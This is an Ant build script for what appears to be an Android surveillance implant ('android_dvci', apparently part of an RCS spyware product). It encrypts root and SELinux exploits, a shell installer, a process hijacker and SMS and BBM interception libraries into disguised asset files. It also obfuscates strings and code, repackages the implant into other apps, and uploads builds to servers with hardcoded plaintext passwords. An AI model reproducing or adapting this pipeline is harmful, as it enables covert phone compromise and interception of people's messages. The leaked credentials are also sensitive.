<?xml version="1.0" encoding="UTF-8"?>
<project name="android_dvci" default="help">

	<target name="help">
		<echo>ant build :  full build</echo>
		<echo>ant dist : create a dist zip in ../dist</echo>
		<echo>ant set-debug-default : make messages.bin and cfg.java, for debug</echo>
		<echo>ant set-release-v2 : make messages.bin and cfg.java, for release</echo>
		<echo>ant update : uploads the core to castore</echo>
		<echo>ant updatecastoredebug</echo>
	</target>

	<taskdef resource="net/sf/antcontrib/antlib.xml">
		<classpath>
			<pathelement location="antlibs/ant-contrib-1.0b3.jar" />
		</classpath>
	</taskdef>

	<taskdef name="iff" classname="net.sf.antcontrib.logic.IfTask" onerror="ignore">
		<classpath>
			<pathelement location="antlibs/ant-contrib-1.0b3.jar" />
		</classpath>
	</taskdef>

	<taskdef name="crypter" classname="com.ant.Crypter">
		<classpath>
			<pathelement path="antlibs/crypter-ant.jar" />
		</classpath>
	</taskdef>

	<taskdef name="stringencrypt" classname="com.ant.StringEncrypt">
		<classpath>
			<pathelement path="antlibs/crypter-ant.jar" />
		</classpath>
	</taskdef>

	<taskdef name="random" classname="com.ant.RandomString">
		<classpath>
			<pathelement path="antlibs/crypter-ant.jar" />
			<fileset dir="../crypter/lib">
				<include name="**/*.jar" />
				<include name="**/*.zip" />
			</fileset>
		</classpath>
	</taskdef>

	<copy file="preprocess/local_properties.txt" tofile="local.properties" overwrite="false" />
	<loadproperties srcFile="local.properties" />
	<property file="ant.properties" />
	<loadproperties srcFile="project.properties" />

	<property name="ddi.sms.lib" value="procacc" />
	<property name="ddi.sms.libout" value="libprocacc.so" />
    <property name="ddi.sms.libL" value="procacc5" />
    <property name="ddi.sms.liboutL" value="libprocacc5.so" />
    <property name="ddi.sms.dir" value="../instrumentation/ddi/injections_libs/smsdispatch/" />
    <property name="ddi.hijacker" value="../instrumentation/adbi/hijack" />
	<property name="rcscore.path" value="antlibs" />
	<property name="out.dir" value="bin" />
	<property name="out.classes.absolute.dir" location="${out.dir}/classes" />

	<import file="custom_rules.xml" optional="true" />

	<target name="release" depends="-set-release-mode, -release-prompt-for-password, -package, -post-package, -post-build" />
	<target name="debug" depends="-set-debug-mode, -set-debug-files, -package, -post-package, -post-build" />
	<target name="instrument" depends="-set-instrumented-mode, debug" />

	<import file="${sdk.dir}/tools/ant/build.xml" />

	<property file="version.properties" />

	<fail message="sdk.dir is missing. Make sure to generate local.properties using 'android update project'" unless="sdk.dir" />

	<!-- version-tag: 2011102401 -->
	<!-- import file="${sdk.dir}/tools/ant/build.xml" -->

	<path id="android.antlibs">
		<pathelement path="${sdk.dir}/tools/lib/anttasks.jar" />
		<pathelement path="${sdk.dir}/tools/lib/sdklib.jar" />
		<pathelement path="${sdk.dir}/tools/lib/androidprefs.jar" />
	</path>

	<!-- extension targets. Uncomment the ones where you want to do custom work
	     in between standard targets -->
	<filterset id="dateFilterSet">
		<filter token="DATE" value="${TODAY}" />
	</filterset>

	<target name="salt" unless="randomSalt">
		<random len="8" property="randomSalt" />
		<random len="8" property="randomKeyMessages" />
		<random len="8" property="randomKeyStatusDb" />
		<random len="8" property="randomKeyStatusLog" />
	</target>

	<target name="init_enc">
		<delete dir="enc" />
		<mkdir dir="enc" />
	</target>

	<target name="encrypt-messages" depends="salt,init_enc">
		<stringencrypt dest="enc" baseDir="src" mFile="preprocess/M.java">
			<path>
				<fileset dir="src/" includes="**/*.java" excludes="**/M.java" />
			</path>
		</stringencrypt>
	</target>

	<target name="encrypt-exploit">
        <echo message="Removing all *.bin file in assets"/>
        <delete>
           <fileset dir="assets/" includes="**/*.bin"/>
        </delete>
        <echo message="Done"/>
		<delete file="assets/sb.data" />
		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}s" inputFile="preprocess/suidext" outputFile="assets/sb.data" />
		<delete file="assets/jb.data" />
		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}j" inputFile="preprocess/selinux_suidext" outputFile="assets/jb.data" />
		<delete file="assets/jbl.data" />
        <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}j" inputFile="preprocess/selinux5_suidext" outputFile="assets/jbl.data" />
		<delete file="assets/hb.data" />
		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}h" inputFile="preprocess/expl_check" outputFile="assets/hb.data" />
		<delete file="assets/db.data" />
		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}d" inputFile="preprocess/selinux_check" outputFile="assets/db.data" />
		<delete file="assets/lb.data" />
		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}l" inputFile="preprocess/local_exploit" outputFile="assets/lb.data" />
		<delete file="assets/gb.data" />
		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}g" inputFile="preprocess/selinux_exploit" outputFile="assets/gb.data" />
        <delete file="assets/nb.data" />
        <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}n" inputFile="preprocess/selinux4_check" outputFile="assets/nb.data" />
        <delete file="assets/ob.data" />
        <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}o" inputFile="preprocess/selinux4_exploit" outputFile="assets/ob.data" />
		<delete file="assets/kb.data" />
		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}k" inputFile="preprocess/shell_installer.sh" outputFile="assets/kb.data" />
        <delete file="assets/bb.data" />
        <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}b" inputFile="preprocess/bbmdecoder" outputFile="assets/bb.data" />
        <delete file="assets/bbl.data" />
        <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}b" inputFile="preprocess/bbmdecoder5" outputFile="assets/bbl.data" />

    </target>

	<target name="encrypt-hijacklibrary">
		<delete file="assets/ib.data" />
		<crypter encrypt="true" inputFile="preprocess/libt.so" keyFile="${randomKeyStatusDb}i" outputFile="assets/ib.data" salt="${randomSalt}" />
		<delete file="assets/mb.data" />
		<crypter encrypt="true" inputFile="preprocess/hijack" keyFile="${randomKeyStatusDb}m" outputFile="assets/mb.data" salt="${randomSalt}" />
        <delete file="assets/mbL.data" />
        <crypter encrypt="true" inputFile="preprocess/hijackL" keyFile="${randomKeyStatusDb}m" outputFile="assets/mbL.data" salt="${randomSalt}" />
        <delete file="assets/pa.data" />
        <crypter encrypt="true" inputFile="preprocess/${ddi.sms.libout}" keyFile="${randomKeyStatusDb}p" outputFile="assets/pa.data" salt="${randomSalt}" />
        <delete file="assets/paL.data" />
        <crypter encrypt="true" inputFile="preprocess/${ddi.sms.liboutL}" keyFile="${randomKeyStatusDb}p" outputFile="assets/paL.data" salt="${randomSalt}" />
	</target>



    <target name="build-instrumentation-clean">
        <echo> cleaning dir ${ddi.sms.dir} </echo>
        <delete>
          <!-- recursive **/ -->
          <fileset dir="${ddi.sms.dir}" includes="**/*.so"/>
        </delete>
        <exec executable="ndk-build" dir="${ddi.hijacker}" failonerror="true">
            <arg value="clean" />
        </exec>
        <exec executable="ndk-build" dir="${ddi.sms.dir}" failonerror="true">
            <arg value="clean" />
        </exec>
    </target>


<macrodef name="build-instr">
   <attribute name="lib" />
   <attribute name="libout" />
   <attribute name="debug" />
   <attribute name="buildDir" />
   <attribute name="buildScript" />
   <sequential>
      <echo> @{buildScript} @{debug} @{lib} </echo>

      <exec executable="@{buildScript}" dir="@{buildDir}" failonerror="true">
        <arg value="@{lib}" />
        <arg value="@{debug}" />
     </exec>
     <copy file="@{buildDir}/libs/armeabi/@{libout}" tofile="preprocess/@{libout}" overwrite="true" />
  </sequential>
</macrodef>

<macrodef name="build-hijack">
   <attribute name="debug" />
   <attribute name="buildDir" />
   <attribute name="out" />
   <sequential>
      <echo> building hijacker @{debug} </echo>
      <exec executable="./build.sh" dir="@{buildDir}" failonerror="true">
        <arg value="@{debug}" />
     </exec>
     <echo> coping hijacker @{out} </echo>
     <copy file="@{buildDir}/libs/armeabi/hijack" tofile="preprocess/@{out}" overwrite="true" />
  </sequential>
</macrodef>

<target name="build-instrumentation-debug-L" >
    <build-hijack debug="-d -P"  buildDir="${ddi.hijacker}" out="hijackL"/>
    <build-instr debug="-d -P" libout="${ddi.sms.liboutL}"  lib="-l${ddi.sms.libL}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
</target>

<target name="build-instrumentation-L" >
   <build-hijack debug="-D -P"  buildDir="${ddi.hijacker}" out="hijackL"/>
   <build-instr debug="-P"   libout="${ddi.sms.liboutL}" lib="-l${ddi.sms.libL}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
</target>


<target name="build-instrumentation-debug" >
  <build-hijack debug="-d"  buildDir="${ddi.hijacker}" out="hijack"/>
  <build-instr debug="-d"  libout="${ddi.sms.libout}" lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
</target>

<target name="build-instrumentation" >
  <build-hijack debug="-D"  buildDir="${ddi.hijacker}" out="hijack"/>
  <build-instr debug=""   libout="${ddi.sms.libout}" lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
</target>



<target name="delete-libs" depends="encrypt-exploit, encrypt-hijacklibrary">
<delete>
    <fileset dir="assets" includes="**/*.data" excludes="**/cb.data,**/rb.data"/>
</delete>
</target>

<target name="libs" depends="build-instrumentation, build-instrumentation-L, encrypt-exploit, encrypt-hijacklibrary">
</target>

<target name="libs-debug" depends="build-instrumentation-debug, build-instrumentation-debug-L, encrypt-exploit,  encrypt-hijacklibrary">
</target>

<target name="init" depends="salt" unless="build.number">
<tstamp>
    <format property="timestamp.BUILD" pattern="yyyyMMdd-HHmmss" />
</tstamp>
<property file="build.number" />
<echo message="timestamp ${timestamp.BUILD}" />
<echo message="build.number ${build.number}" />

</target>

<!-- = = = = = = = = = = = = = = = = =
  macrodef: set-cfg0
  copies Cfg.java considering:
  - kind: debug, release
  - version: 2,3
  TODO
 = = = = = = = = = = = = = = = = = -->
	<macrodef name="set-cfg">
		<attribute name="kind" />
		<attribute name="osversion" />
		<sequential>
			<echo message="osversion: @{osversion}" />
			<echo message="kind: @{kind}" />

			<switch value="@{kind}">
				<case value="debug">
					<echo message="set debug" />

					<var name="isdebug" value="true" />
                    <var name="gui" value="true" />

					<copy file="preprocess/config.debug.bin" toFile="assets/cb.data" overwrite="true" />
					<copy file="preprocess/resources.patched.bin" toFile="assets/rb.data" overwrite="true" />

				</case>
				<case value="releasedebug">
					<echo message="set releasedebug" />
					<var name="isdebug" value="true" />
					<var name="gui" value="true" />

					<copy file="preprocess/config.release.bin" toFile="assets/cb.data" overwrite="true" />
					<copy file="preprocess/resources.unpatched.bin" toFile="assets/rb.data" overwrite="true" />

				</case>
				<case value="release">
					<echo message="set release" />
                    <var name="gui" value="true" />

					<copy file="preprocess/config.release.bin" toFile="assets/cb.data" overwrite="true" />
					<copy file="preprocess/resources.unpatched.bin" toFile="assets/rb.data" overwrite="true" />

				</case>
				<case value="merge">
					<echo message="set merge" />

					<var name="isdebug" value="true" />
                    <var name="gui" value="false" />

					<copy file="preprocess/config.release.bin" toFile="assets/cb.data" overwrite="true" />
					<copy file="preprocess/resources.unpatched.bin" toFile="assets/rb.data" overwrite="true" />

				</case>


			</switch>

            <var name="BB10" value="false" />
            <switch value="@{osversion}">

				<case value="v2" >

					<!-- Alzare l'api level in caso di 3.x o 4.x -->
					<echo message="Copy BackGround" />
					<echo message="Copy BackGround" />

					<copy file="preprocess/AndroidManifest.BACKGROUND.xml" tofile="AndroidManifest.xml" overwrite="true">
						<filterset>
							<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
							<filter token="DEBUGGABLE" value="${isdebug}" />
						</filterset>
					</copy>
                    <var name="gui" value="false" />
				</case>
				<default>
					<echo message="Copy Activity" />
					<copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="true">
						<filterset>
							<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
							<filter token="DEBUGGABLE" value="${isdebug}" />
						</filterset>
					</copy>
				</default>
			</switch>

			<delete file="assets/statuslog" />
			<delete file="assets/statusdb" />

			<echo message="copy resources and Cfg" />

			<copy file="preprocess/Cfg.java" toFile="src/com/android/dvci/auto/Cfg.java" overwrite="true">
				<filterset>
					<filter token="BUILD_ID" value="${build.number}" />
					<filter token="BUILD_TIMESTAMP" value="${timestamp.BUILD}" />
					<filter token="DEBUG" value="${isdebug}" />
					<filter token="EXCEPTION" value="${isdebug}" />
                    <filter token="BB10" value="${BB10}" />
					<filter token="DEMO" value="${isdebug}" />
                    <filter token="GUI" value="${gui}" />
					<!-- TODO RIMETTERE!!!! filter token="KEYS" value="${isdebug}" / -->
					<filter token="KEYS" value="false" />
					<filter token="FILE" value="true" />
					<filter token="RANDOM" value="${randomSalt}" />
					<filter token="OSVERSION" value="@{osversion}" />
					<filter token="VERSION" value="${version}" />
					<filter token="RNDLOG" value="${randomKeyStatusLog}" />
					<filter token="RNDDB" value="${randomKeyStatusDb}" />
					<filter token="RNDMSG" value="${randomKeyMessages}" />
				</filterset>
			</copy>

            <copy file="preprocess/styles.xml" toFile="res/values/styles.xml" overwrite="true"/>

			<switch value="${osversion}">
				<case value="bb10">
                    <echo>Delete libraries, because bb10</echo>
                    <antcall target="delete-libs" />
                </case>
                <default>
                    <switch value="${isdebug}">
                        <case value="true">
                            <echo message="call libs-debug" />
                            <antcall target="libs-debug" />
                        </case>
                        <default>
                            <echo message="call libs" />
                            <antcall target="libs" />
                        </default>
                    </switch>
                </default>
			</switch>


		</sequential>
	</macrodef>

	<macrodef name="updaterelease">
		<attribute name="server" />
		<attribute name="login" />
		<attribute name="password" />
		<attribute name="file" />
		<sequential>
			<echo>@{server} : ${rcscore.path}/rcs-core.rb</echo>

			<exec executable="${ruby.path}" dir="." failonerror="true">
				<arg value="${rcscore.path}/rcs-core.rb" />
				<arg value="-u" />
				<arg value="@{login}" />
				<arg value="-p" />
				<arg value="@{password}" />
				<arg value="-d" />
				<arg value="@{server}" />
				<arg value="-n" />
				<arg value="android" />
				<arg value="-R" />
				<arg value="@{file}" />
			</exec>

		</sequential>
	</macrodef>

	<macrodef name="zipdist">
		<attribute name="destfile" />
		<sequential>
			<zip destfile="@{destfile}">
				<zipfileset dir="../RCSAndroid" prefix="RCSAndroid" />
				<zipfileset dir="crypter" prefix="crypter" />
				<zipfileset dir="." includes="server" />
				<fileset dir="." includes="local.properties" />
				<fileset dir="." includes="ant.properties" />
				<fileset dir="." includes="build.xml" />
				<fileset dir="." includes="build.number" />
				<fileset dir="." includes="version" />
			</zip>
		</sequential>
	</macrodef>

	<target name="reverse">
		<echo message="Reverse" />
		<deltree dir="reverse" />
		<copy file="bin/android_dvci-release.apk" toDir="reverse" />
		<unzip src="reverse/android_dvci-release.apk" dest="reverse" />

		<exec executable="..\..\HT\Reversing\dex2jar\dex2jar.bat">
			<arg value="reverse/classes.dex" />
		</exec>
		<exec executable="..\..\HT\Reversing\jd-gui.exe">
			<arg value="reverse/classes.dex.dex2jar.jar" />
		</exec>

	</target>

	<target name="set-debug-v2" depends="init">
		<set-cfg kind="debug" osversion="v2">
		</set-cfg>
	</target>

	<target name="set-release-v2" depends="init">
		<set-cfg kind="release" osversion="v2">
		</set-cfg>
	</target>

	<target name="set-release-default" depends="init">
		<set-cfg kind="release" osversion="default">
		</set-cfg>
	</target>

	<target name="set-merge-v2" depends="init">
		<set-cfg kind="merge" osversion="v2">
		</set-cfg>
	</target>

	<target name="set-debug-default" depends="init">
		<set-cfg kind="debug" osversion="default">
		</set-cfg>

		<delete dir="enc" />
	</target>

    <target name="set-debug-bb10" depends="init">
        <set-cfg kind="debug" osversion="bb10">
        </set-cfg>

        <delete dir="enc" />
    </target>

	<target name="set-debug" depends="set-debug-default"/>

	<target name="init_build" depends="clean">
		<buildnumber />
		<delete dir="output" />
		<echo message="==================" />
		<echo message="=== init BUILD ===" />
		<echo message="==================" />

	</target>

	<target name="build_var">
		<echo>Version @{osversion}</echo>
		<var name="kind" value="debug" />

		<echo>clean</echo>
		<antcall target="clean" />

		<echo message="bin/@{osversion}/@{kind}/core.android" />
		<set-cfg osversion="@{osversion}" kind="@{kind}" />

		<echo>call release</echo>
		<antcall target="release" inheritAll="false" />
		<!-- <var name="filename" value="bin/android_dvci-release-unsigned.apk" /> -->
		<var name="filename" value="bin/android_dvci-release.apk" />

		<mkdir dir="output/@{kind}/" />
		<copy file="${filename}" toFile="output/@{kind}/core.android.@{osversion}.apk" overwrite="true" />
	</target>

	<target name="build_default" depends="init_build">
		<var name="osversion" value="default" />
		<antcall target="build_var" />
	</target>

	<target name="build_v2" depends="init_build">
		<var name="osversion" value="v2" />
		<antcall target="build_var" />
	</target>

    <target name="build_mapping" depends="init">

        <var name="kind" value="release" />
        <var name="isdebug" value="false" />
        <var name="osversion" value="mapping" />
        <antcall target="encrypt-messages" />
        <antcall target="release" inheritAll="false" />
        <antcall target="make_mapping" />
    </target>

    <target name="build_bb10" depends="init_build">
        <var name="osversion" value="bb10" />
        <antcall target="build_var" />
    </target>

	<target name="build" depends="init">

		<for list="default,v2,bb10" param="osversion">
			<sequential>
				<echo message="==============" />
				<echo message="===  BUILD ===" />
				<echo message="==============" />
				<echo>Version @{osversion}</echo>

				<var name="kind" value="release" />
				<var name="isdebug" value="false" />

				<echo>clean</echo>
				<antcall target="clean" />

				<echo message="bin/@{osversion}/${kind}/core.android" />
				<set-cfg osversion="@{osversion}" kind="${kind}" />

				<antcall target="encrypt-messages" />

				<echo>call release</echo>

                <antcall target="make_dexguard_release" inheritAll="false">
                    <param name="mapping" value="#"/>
                </antcall>
				<antcall target="release" inheritAll="false" />

                <antcall target="make_mapping"/>

                <antcall target="make_dexguard_release" inheritAll="false">
                    <param name="mapping" value=""/>
                </antcall>

                <antcall target="release" inheritAll="false" />

				<!-- <var name="filename" value="bin/android_dvci-release-unsigned.apk" /> -->
				<var name="filename" value="bin/android_dvci-release.apk" />

				<mkdir dir="output/${kind}/" />
				<copy file="${filename}" toFile="output/${kind}/core.android.@{osversion}.apk" overwrite="true" />
			</sequential>
		</for>

		<antcall target="merge" />
	</target>

    <target name="make_dexguard_release">
        <copy file="preprocess/dexguard-project.mapping.txt" toFile="dexguard-project.txt" overwrite="true">
            <filterset>
                <filter token="MERGE" value="#"/>
                <filter token="RELEASE" value=""/>
                <filter token="MAPPING" value="${mapping}"/>
				<filter token="DEBUG" value=""/>
            </filterset>
        </copy>
    </target>

    <target name="make_dexguard_merge">
        <copy file="preprocess/dexguard-project.mapping.txt" toFile="dexguard-project.txt" overwrite="true">
            <filterset>
                <filter token="MERGE" value=""/>
                <filter token="RELEASE" value="#"/>
                <filter token="MAPPING" value="${mapping}"/>
				<filter token="DEBUG" value="#"/>
            </filterset>
        </copy>
    </target>


    <!-- takes the mapping.txt generated by dexguard and modifies the default namespace-->
    <target name="make_mapping">

        <copy file="bin/proguard/mapping.txt" toFile="mapping.orig.txt"/>

        <exec executable="sed" dir="." failonerror="true" output="rcs_mapping.txt">
            <arg value="s/-> o\./-> stt./" />
            <arg value="bin/proguard/mapping.txt" />
        </exec>
    </target>

	<target name="build-debug" depends="init">

		<for list="default,v2,bb10" param="osversion">
			<sequential>
				<echo message="===========================" />
				<echo message="===  BUILD releasedebug ===" />
				<echo message="===========================" />
				<echo>Version @{osversion}</echo>

				<var name="kind" value="releasedebug" />
				<var name="isdebug" value="true" />

				<echo>clean</echo>
				<antcall target="clean" />

				<echo message="bin/@{osversion}/${kind}/core.android" />
				<set-cfg osversion="@{osversion}" kind="release" />

				<antcall target="encrypt-messages" />

				<echo>call release</echo>
                <antcall target="make_dexguard_release" inheritAll="false">
                    <param name="mapping" value="#"/>
                </antcall>
                <antcall target="release" inheritAll="false" />

                <antcall target="make_mapping"/>

                <antcall target="make_dexguard_release" inheritAll="false">
                    <param name="mapping" value=""/>
                </antcall>

                <antcall target="release" inheritAll="false" />
				<!-- <var name="filename" value="bin/android_dvci-release-unsigned.apk" /> -->
				<var name="filename" value="bin/android_dvci-release.apk" />

				<mkdir dir="output/${kind}/" />
				<copy file="${filename}" toFile="output/${kind}/core.android.@{osversion}.apk" overwrite="true" />
			</sequential>

		</for>

		<antcall target="merge" />
	</target>

	<target name="repackmerge">
		<java fork="true" jar="server/core/apktool.jar" dir="output/merge">
			<arg line="d -r -s -f core.android.melt.apk" />
		</java>
		<copy file="preprocess/AndroidManifest.BACKGROUND.xml" toFile="output/merge/core.android.melt/AndroidManifest.xml" overwrite="true" />
		<java fork="true" jar="server/core/apktool.jar" dir="output/merge">
			<arg line="b -f core.android.melt.pre core.android.melt.apk" />
		</java>
	</target>

	<target name="merge" depends="init">
		<antcall target="clean" />
		<set-cfg osversion="v2" kind="merge" />
		<echo message="=================" />
		<echo message="== BUILD merge ==" />
		<echo message="=================" />
        <antcall target="make_dexguard_merge" inheritAll="false">
            <param name="mapping" value="#"/>
        </antcall>
        <antcall target="release" inheritAll="false" />

        <antcall target="make_mapping"/>

        <antcall target="make_dexguard_merge" inheritAll="false">
            <param name="mapping" value=""/>
        </antcall>

        <antcall target="release" inheritAll="false" />
		<!-- <var name="filename" value="bin/android_dvci-release-unsigned.apk" /> -->
		<var name="filename" value="bin/android_dvci-release.apk" />
		<mkdir dir="output/merge/" />
		<copy file="${filename}" toFile="output/merge/core.android.melt.apk" overwrite="true" />
		<!-- <copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" /> -->

		<echo>../../merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
	</target>

	<target name="servercore">
		<delete dir="server/core" />
		<mkdir dir="server/core" />

		<copy toDir="server/core" overwrite="true">
			<fileset dir="server/template" excludes="version" />
		</copy>

		<copy toDir="server/core" overwrite="true">
			<fileset dir="server/template" includes="version" />
			<filterset>
				<filter token="VERSION" value="${version}" />
			</filterset>
		</copy>


        <copy file="output/release/core.android.v2.apk" toDir="server/core" overwrite="true"/>
        <copy file="output/release/core.android.default.apk" toDir="server/core" overwrite="true"/>
        <copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />

		<zip destfile="server/android_${version}.zip" basedir="server/core" />
	</target>

    <target name="servercore_bb10">
        <delete dir="server/core_bb10" />
        <mkdir dir="server/core_bb10" />

        <copy toDir="server/core_bb10" overwrite="true">
            <fileset dir="server/template_bb10" excludes="version" />
        </copy>

        <copy toDir="server/core_bb10" overwrite="true">
            <fileset dir="server/template_bb10" includes="version" />
            <filterset>
                <filter token="VERSION" value="${version}" />
            </filterset>
        </copy>

        <copy file="output/release/core.android.bb10.apk" toFile="server/core_bb10/core.bb10.apk" overwrite="true"/>
        <zip destfile="server/bb10_${version}.zip" basedir="server/core_bb10" />
        <echo>rcs-core -u batch -p Fabriziop123 -d rcs-local -n bb10 -f RCS_0000000001 -b server/template_bb10/b.json -o bb10.apk</echo>
    </target>

	<target name="dist" depends="init">
		<echo>version = ${version}</echo>
		<echo>release = ${do.release}</echo>

		<var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
		<echo>${destdir}</echo>
		<mkdir dir="${destdir}" />

		<antcall target="servercore" />
		<copy file="server/android_${version}.zip" toDir="${destdir}" overwrite="true" />

        <antcall target="servercore_bb10" />

		<!--<zip destfile="${destdir}/android_sources.zip" basedir="." excludes="**/core-android-native/*,**/native/*,**/melting/*,**/build/intermediates/**,**/build/generated/**,**/classes/**,**/server/historic/**,server/*.zip,**/melting/tmp/**,**/melting/host.apk,**/antlibs/historic/**,**/sqlite/**" />-->
		<zip destfile="${destdir}/android_sources.zip" basedir="." excludes="obj/**,**/samples/**,tmp/**,core-android-native/**,native/**,**/build/intermediates/**,**/build/generated/**,**/classes/**,**/server/historic/**,server/*.zip,**/melting/tmp/**,**/melting/host.apk,**/antlibs/historic/**,**/sqlite/**" />

		<checksum>
			<fileset dir="${destdir}/">
				<include name="*" />
			</fileset>
		</checksum>
	</target>

    <macrodef name="updaterelease">
        <attribute name="server" />
        <attribute name="login" />
        <attribute name="password" />
        <attribute name="file" />
        <attribute name="core" />
        <sequential>
            <echo>@{server} : ${rcscore.path}/rcs-core.rb</echo>

            <exec executable="${ruby.path}" dir="." failonerror="true">
                <arg value="${rcscore.path}/rcs-core.rb" />
                <arg value="-u" />
                <arg value="@{login}" />
                <arg value="-p" />
                <arg value="@{password}" />
                <arg value="-d" />
                <arg value="@{server}" />
                <arg value="-n" />
                <arg value="@{core}" />
                <arg value="-R" />
                <arg value="@{file}" />
            </exec>
        </sequential>
    </macrodef>

    <macrodef name="buildsilent">
        <!-- rcs-core -u batch -p Fabriziop123 -d rcs-local -n bb10 -f RCS_0000000001 -b server/template_bb10/b.json -o bb10.apk -->
        <attribute name="server" />
        <attribute name="login" />
        <attribute name="password" />
        <attribute name="core" />
        <attribute name="json" />
        <attribute name="factory" />
        <sequential>
            <echo>@{server} : ${rcscore.path}/rcs-core.rb</echo>

            <exec executable="${ruby.path}" dir="." failonerror="true">
                <arg value="${rcscore.path}/rcs-core.rb" />
                <arg value="-u" />
                <arg value="@{login}" />
                <arg value="-p" />
                <arg value="@{password}" />
                <arg value="-d" />
                <arg value="@{server}" />
                <arg value="-n" />
                <arg value="@{core}" />
                <arg value="-f" />
                <arg value="@{factory}" />
                <arg value="-b" />
                <arg value="@{json}" />
                <arg value="-o" />
                <arg value="output/@{core}_@{server}.zip" />
            </exec>
        </sequential>
    </macrodef>

    <target name="silent-bb10">
		<!--<buildsilent server="rcs-local" login="batch" password="Fabriziop123" core="bb10" json="antlibs/bb10_silent.json" factory="RCS_0000000001"  />-->

		<buildsilent server="rcs-castore" login="zenobatch" password="castoreP123" core="bb10" json="antlibs/bb10_silent.json" factory="RCS_0000002478"  />
    </target>

	<target name="update">
		<updaterelease server="rcs-castore" login="zenobatch" password="castoreP123" file="server/android_${version}.zip" core="android"/>
		<copy file="./server/android_${version}.zip" toFile="/Volumes/SHARE/RELEASE/SVILUPPO/cores galileo/android.zip" overwrite="true" />
	</target>

    <target name="test-polluce-debug" depends="build-debug">
        <antcall target="servercore" />
        <antcall target="update-polluce" />
        <antcall target="set-debug" />
    </target>

    <target name="test-castore-debug" depends="build-debug">
        <antcall target="servercore" />
        <antcall target="update-castore" />
        <antcall target="set-debug" />
    </target>

	<target name="test-castore" depends="build">
		<antcall target="servercore" />
		<antcall target="update-castore" />
        <antcall target="set-debug" />
	</target>

    <target name="test-local" depends="build-debug">
        <antcall target="servercore_bb10" />
        <antcall target="update-bb10" />
        <antcall target="set-debug" />
    </target>

	<target name="update-castore">
		<updaterelease server="rcs-castore" login="zenobatch" password="castoreP123" file="server/android_${version}.zip" core="android" />
	</target>

	<target name="update-polluce">
		<updaterelease server="rcs-polluce" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" core="android"/>
	</target>

    <target name="update-bb10">
        <updaterelease server="rcs-local" login="batch" password="Fabriziop123" file="server/bb10_${version}.zip" core="bb10"/>
        <antcall target="silent-bb10"/>
    </target>

	<target name="update-zeus">
		<updaterelease server="192.168.100.190" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" core="android"/>
		<!-- <copy file=".\server\bb10_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
	</target>

	<target name="update-minotauro">
		<updaterelease server="rcs-minotauro" login="zeno" password="zenop123" file="server/android_${version}.zip" core="android"/>
	</target>

	<target name="ci">
		<echo>target ci</echo>
		<copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="false" />
		<antcall target="build" />
		<var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
		<echo>${destdir}</echo>
		<mkdir dir="${destdir}" />

		<antcall target="servercore" />
		<copy file="server/android_${version}.zip" toDir="${destdir}" overwrite="true" />
		<antcall target="updateminotauro" />
	</target>

</project>
